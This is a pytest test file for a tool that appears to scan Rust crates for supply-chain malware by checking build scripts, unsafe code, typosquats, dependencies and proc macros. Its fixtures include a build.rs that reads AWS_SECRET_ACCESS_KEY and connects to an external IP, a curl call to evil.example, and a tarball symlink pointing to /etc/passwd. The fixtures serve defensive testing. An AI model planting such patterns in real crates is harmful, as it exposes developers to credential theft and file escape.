import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from crateshield.signals.build_rs import analyze_build_rs
from crateshield.signals.unsafe_ffi import analyze_unsafe_ffi
from crateshield.signals.typosquat import levenshtein, typosquat_score
from crateshield.signals.dependencies import analyze_dependencies
from crateshield.signals.proc_macro import analyze_proc_macro


def test_build_rs_flags_network_and_env():
    src = '''
    fn main() {
        let key = env::var("AWS_SECRET_ACCESS_KEY").unwrap();
        let stream = TcpStream::connect("185.220.101.45:443").unwrap();
    }
    '''
    result = analyze_build_rs(src)
    assert result["has_build_rs"] is True
    assert "network_call" in result["signals"]
    assert "env_var_read" in result["signals"]


def test_build_rs_absent():
    result = analyze_build_rs(None)
    assert result["has_build_rs"] is False
    assert result["signals"] == []


def test_unsafe_ffi_counts_blocks():
    files = {"lib.rs": "fn f() { unsafe { libc::syscall(1); } unsafe { let x = 1; } }"}
    result = analyze_unsafe_ffi(files)
    assert result["unsafe_block_count"] == 2
    assert len(result["syscall_usage"]) == 1


def test_typosquat_distance():
    assert levenshtein("serde", "serde") == 0
    assert levenshtein("serde", "serdee") == 1
    score = typosquat_score("rustdecimall", "rust_decimal")
    assert score > 0.8


def test_dependencies_parsing():
    toml = '''
    [package]
    name = "foo"

    [dependencies]
    serde = "1.0.0"
    tokio = { version = "1", features = ["full"] }

    [dev-dependencies]
    proptest = "1"
    '''
    result = analyze_dependencies(toml)
    assert result["count"] == 2
    assert "serde" in result["names"]
    assert result["dev_dependency_count"] == 1


def test_proc_macro_detection():
    toml = '[lib]\nproc-macro = true'
    files = {"lib.rs": "use std::process; fn foo() {}"}
    result = analyze_proc_macro(toml, files)
    assert result["is_proc_macro"] is True
    assert "std::process" in result["proc_macro_suspicious_imports"]


def test_resolve_build_script_default():
    from crateshield.ingestion.downloader import resolve_build_script_path
    assert resolve_build_script_path('[package]\nname="foo"') == "build.rs"


def test_resolve_build_script_custom_path():
    """Evasion check: a crate can point `build` at any filename -- this
    must be honored, not just the literal name 'build.rs'."""
    from crateshield.ingestion.downloader import resolve_build_script_path
    toml = '[package]\nname="foo"\nbuild="scripts/setup.rs"'
    assert resolve_build_script_path(toml) == "scripts/setup.rs"


def test_resolve_build_script_disabled():
    """False-positive check: build = false means Cargo will never run
    build.rs even if the file physically exists in the tarball."""
    from crateshield.ingestion.downloader import resolve_build_script_path
    toml = '[package]\nname="foo"\nbuild=false'
    assert resolve_build_script_path(toml) is None


def test_proc_macro_ignores_commented_out_key():
    """A TOML comment containing `proc-macro = true` must not false-flag
    -- this requires real TOML parsing, not text regex."""
    toml = '[package]\nname="foo"\n\n[lib]\n# proc-macro = true\nname="foo"\n'
    result = analyze_proc_macro(toml, {})
    assert result["is_proc_macro"] is False


def test_dependencies_scans_target_specific_tables():
    """Evasion check: a malicious dependency hidden behind a
    [target.'cfg(...)'.dependencies] table must still be caught, not just
    the plain [dependencies] section."""
    toml = (
        '[package]\nname="foo"\n\n'
        '[dependencies]\nserde="1.0"\n\n'
        '[target.\'cfg(target_os = "linux")\'.dependencies]\n'
        'evil-payload-crate="0.1.0"\n'
    )
    result = analyze_dependencies(toml)
    assert "evil-payload-crate" in result["names"]
    assert result["count"] == 2


def test_collect_rs_files_respects_custom_lib_path(tmp_path):
    """Evasion check: code living outside src/ via a custom [lib] path
    must still be scanned, not silently skipped."""
    from crateshield.ingestion.downloader import collect_rs_files

    (tmp_path / "Cargo.toml").write_text('[package]\nname="foo"\n\n[lib]\npath="custom_root/lib.rs"\n')
    (tmp_path / "custom_root").mkdir()
    (tmp_path / "custom_root" / "lib.rs").write_text("fn evil() {}")
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "main.rs").write_text("fn main() {}")

    files = collect_rs_files(tmp_path)
    assert any("evil" in c for c in files.values())
    assert any("main" in c for c in files.values())


def test_build_rs_excluded_from_library_source_scan(tmp_path):
    """Regression check: build.rs must not be double-counted into the
    library's unsafe/FFI signal (Signal 2) just because it's also a .rs
    file under the crate root -- it's Signal 1's own domain. Without this,
    unsafe code that only exists in the build script would incorrectly
    inflate the reported LIBRARY unsafe-block count."""
    from crateshield.ingestion.downloader import preprocess_crate

    (tmp_path / "Cargo.toml").write_text('[package]\nname="foo"\n')
    (tmp_path / "build.rs").write_text("fn main() { unsafe { libc::syscall(9); } }")
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "lib.rs").write_text("pub fn safe_fn() {}")

    pre = preprocess_crate("foo", "0.1.0", tmp_path)
    assert "build.rs" not in pre["source_files"]
    assert pre["build_rs"] is not None  # still captured, just via its own dedicated field


def test_collect_rs_files_excludes_examples_tests_benches(tmp_path):
    """examples/, tests/, and benches/ are not compiled into the shipped
    library/binary by `cargo build` -- illustrative unsafe/FFI usage there
    (common and often intentional in examples) must not be scanned as if
    it were part of the actual shipped artifact."""
    from crateshield.ingestion.downloader import collect_rs_files

    (tmp_path / "Cargo.toml").write_text('[package]\nname="bar"\n')
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "lib.rs").write_text("pub fn f() {}")
    (tmp_path / "examples").mkdir()
    (tmp_path / "examples" / "demo.rs").write_text("unsafe { libc::syscall(1); }")
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "it.rs").write_text("fn test1() {}")

    files = collect_rs_files(tmp_path)
    assert "examples/demo.rs" not in files
    assert "tests/it.rs" not in files
    assert "src/lib.rs" in files


def test_extract_crate_rejects_symlink_escaping_root(tmp_path):
    """Security check: a symlink tar member whose target resolves outside
    the extraction root must be rejected, even if its own entry name
    looks harmless."""
    import io
    import tarfile
    from crateshield.ingestion.downloader import extract_crate

    tarball_path = tmp_path / "evil.crate"
    with tarfile.open(tarball_path, "w:gz") as tar:
        info = tarfile.TarInfo(name="evil-0.1.0/Cargo.toml")
        data = b'[package]\nname="evil"\n'
        info.size = len(data)
        tar.addfile(info, __import__("io").BytesIO(data))

        link = tarfile.TarInfo(name="evil-0.1.0/notes.txt")
        link.type = tarfile.SYMTYPE
        link.linkname = "../../../../etc/passwd"
        tar.addfile(link)

    extract_root = tmp_path / "extracted"
    extract_crate(tarball_path, extract_root)

    assert not (extract_root / "evil-0.1.0" / "notes.txt").exists()
    assert (extract_root / "evil-0.1.0" / "Cargo.toml").exists()


if __name__ == "__main__":
    import pytest
    sys.exit(pytest.main([__file__, "-v"]))


def test_build_rs_serde_style_real_crate_is_not_flagged():
    """Regression: reading TARGET/RUSTC and shelling out to `rustc --version`
    to gate language features (serde's actual build.rs) must not fire."""
    src = (
        'use std::env;\n'
        'use std::process::Command;\n\n'
        'fn main() {\n'
        '    let target = env::var("TARGET").unwrap();\n'
        '    let rustc = match env::var_os("RUSTC") {\n'
        '        Some(rustc) => rustc,\n'
        '        None => return,\n'
        '    };\n'
        '    let output = match Command::new(rustc).arg("--version").output() {\n'
        '        Ok(output) => output,\n'
        '        Err(_) => return,\n'
        '    };\n'
        '}\n'
    )
    r = analyze_build_rs(src)
    assert r["signals"] == []
    assert "env_var_read" in r["benign_explained"] and "process_spawn" in r["benign_explained"]


def test_build_rs_use_import_line_is_not_a_call_site():
    r = analyze_build_rs('use std::process::Command;\nfn main() {}\n')
    assert r["process_spawns"] == [] and r["signals"] == []


def test_build_rs_unrelated_command_call_still_flagged():
    r = analyze_build_rs('fn main() { std::process::Command::new("curl").arg("http://evil.example").spawn(); }')
    assert "process_spawn" in r["signals"]


def test_build_rs_non_cargo_env_var_is_unexplained():
    r = analyze_build_rs('fn main() { let k = std::env::var("AWS_SECRET_ACCESS_KEY").unwrap(); }')
    assert "env_var_read" in r["signals"]
